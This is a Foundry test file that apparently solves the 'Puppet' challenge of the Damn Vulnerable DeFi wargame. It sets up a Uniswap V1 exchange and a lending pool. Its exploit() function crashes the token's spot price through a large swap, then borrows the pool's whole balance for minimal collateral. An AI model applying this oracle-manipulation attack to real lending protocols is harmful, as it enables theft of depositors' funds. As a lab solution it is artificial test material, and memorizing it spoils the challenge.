// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import "../../src/DamnValuableToken.sol";
import "../../src/puppet/PuppetPool.sol";

interface UniswapV1Exchange {
    function addLiquidity(uint256 min_liquidity, uint256 max_tokens, uint256 deadline)
        external
        payable
        returns (uint256);

    function balanceOf(address _owner) external view returns (uint256);

    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);

    function getTokenToEthInputPrice(uint256 tokens_sold) external view returns (uint256);
}

interface UniswapV1Factory {
    function initializeFactory(address template) external;

    function createExchange(address token) external returns (address);
}

contract PuppetTest is Test {
    address public deployer;
    address public player;

    DamnValuableToken public token;
    PuppetPool public puppetPool;

    UniswapV1Exchange internal uniswapV1ExchangeTemplate;
    UniswapV1Exchange internal uniswapExchange;
    UniswapV1Factory internal uniswapV1Factory;

    uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 internal constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;

    uint256 internal constant PLAYER_INITIAL_TOKEN_BALANCE = 1_000e18;
    uint256 internal constant PLAYER_INITIAL_ETH_BALANCE = 25e18;

    uint256 internal constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
    uint256 internal constant DEADLINE = 10_000_000;

    function setUp() public {
        deployer = makeAddr("deployer");
        player = makeAddr("player");
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        assertEq(address(player).balance, PLAYER_INITIAL_ETH_BALANCE);
        // Deploy token to be traded in Uniswap
        token = new DamnValuableToken();

        uniswapV1Factory = UniswapV1Factory(deployCode("./build-uniswap-v1/UniswapV1Factory.json"));

        // Deploy a exchange that will be used as the factory template
        uniswapV1ExchangeTemplate = UniswapV1Exchange(deployCode("./build-uniswap-v1/UniswapV1Exchange.json"));

        // Deploy factory, initializing it with the address of the template exchange
        uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));

        uniswapExchange = UniswapV1Exchange(uniswapV1Factory.createExchange(address(token)));

        vm.label(address(uniswapExchange), "Uniswap Exchange");

        // Deploy the lending pool
        puppetPool = new PuppetPool(address(token), address(uniswapExchange));
        vm.label(address(puppetPool), "Puppet Pool");

        // Add initial token and ETH liquidity to the pool
        token.approve(address(uniswapExchange), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapExchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
            0, // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE, // max_tokens
            DEADLINE // deadline
        );

        // Ensure Uniswap exchange is working as expected
        assertEq(
            uniswapExchange.getTokenToEthInputPrice(1 ether),
            calculateTokenToEthInputPrice(1 ether, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE)
        );

        // Setup initial token balances of pool and attacker account
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(puppetPool), POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool.
        assertEq(puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE), POOL_INITIAL_TOKEN_BALANCE * 2);

        vm.stopPrank();
    }

    function exploit() public {
        vm.startPrank(player);

        emit log_named_decimal_uint("uni pair balance: ", address(uniswapExchange).balance, 18);
        token.approve(address(uniswapExchange), PLAYER_INITIAL_TOKEN_BALANCE);
        uniswapExchange.tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE, 1, 9999999999);
        emit log_named_decimal_uint("uni pair balance: ", address(uniswapExchange).balance, 18);

        uint256 collateral = puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        emit log_named_decimal_uint("collateral: ", collateral, 18);
        puppetPool.borrow{value: collateral}(POOL_INITIAL_TOKEN_BALANCE, player);

        vm.stopPrank();
    }

    function calculateTokenToEthInputPrice(uint256 tokensSold, uint256 tokensInReserve, uint256 etherInReserve)
        public
        pure
        returns (uint256)
    {
        return (tokensSold * 997 * etherInReserve) / (tokensInReserve * 1000 + tokensSold * 997);
    }

    function test_exploit() public {
        exploit();
        assertGe(token.balanceOf(player), POOL_INITIAL_TOKEN_BALANCE);
        assertEq(token.balanceOf(address(puppetPool)), 0);
    }
}
